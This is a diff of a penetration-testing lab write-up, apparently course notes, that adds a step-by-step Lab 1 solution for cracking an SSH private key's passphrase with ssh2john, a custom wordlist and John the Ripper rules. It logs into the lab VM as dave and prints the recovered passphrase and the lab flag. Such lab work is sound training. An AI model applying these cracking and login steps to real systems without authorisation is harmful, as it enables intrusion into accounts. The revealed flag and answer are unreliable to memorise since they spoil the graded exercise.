@@ -187,9 +187,86 @@ Entering Passphrase to connect to the target system with SSH
 
 Lab 1 - Follow the steps outlined in this section to get access to VM #1 (BRUTE) on port 2222 with SSH by cracking the passphrase of the private key. Find the flag in the home directory of the user dave.
 >``` shell
+># Open the web application in a browser
 >
+># Log in using provided credentials
+>Username: user
+>Password: 121212
+>
+># Download the files from the web app
+>note.txt
+>id_rsa
+>
+># Fix private key permissions
+>kali@kali:~/passwordattacks$ chmod 600 id_rsa
+>
+># Attempt SSH Login (Confirm Passphrase Protection)
+>kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.213.201
+>
+># ========== Expected Result ==========
+>...
+>Enter passphrase for key 'id_rsa':
+>...
+># =====================================
+>
+># Convert the private key into John format
+>kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash
+>
+># Verify the hash file
+>kali@kali:~/passwordattacks$ cat ssh.hash
+>
+># ========== Expected Result ==========
+>...
+>id_rsa:$sshng$6$16$...
+>...
+># =====================================
+>
+># Create a wordlist based on note.txt
+>kali@kali:~/passwordattacks$ cat > ssh.passwords << EOF
+>Window
+>rickc137
+>dave
+>superdave
+>megadave
+>umbrella
+>EOF
+>
+># Create a rules file
+>kali@kali:~/passwordattacks$ cat > ssh.rule << EOF
+>[List.Rules:sshRules]
+>c $1 $3 $7 $!
+>c $1 $3 $7 $@
+>c $1 $3 $7 $#
+>EOF
+>
+># Add rules to John configuration
+>kali@kali:~/passwordattacks$ sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'
+>
+># Crack the SSH Key Passphrase
+>kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
+>
+># ========== Expected Result ==========
+>...
+>Umbrella137!
+>...
+># =====================================
+>
+># Display cracked password
+>kali@kali:~/passwordattacks$ john --show ssh.hash
+>
+># ========== Expected Result ==========
+>id_rsa:Umbrella137!
+># =====================================
+>
+># SSH into the Target as dave
+>kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.213.201
+>
+># Retrieve the Flag
+>cd ~
+>ls
+>cat flag.txt
 >```
->
+>OS{03d37f8c50b70ae5e29f770f8e6b9b72}
 
 Lab 2 - Enumerate VM #1 and find a way to get access to SSH on port 2223. Find the flag in the home directory of the user alfred. You can use the same rules we created in this section.
 >``` shell
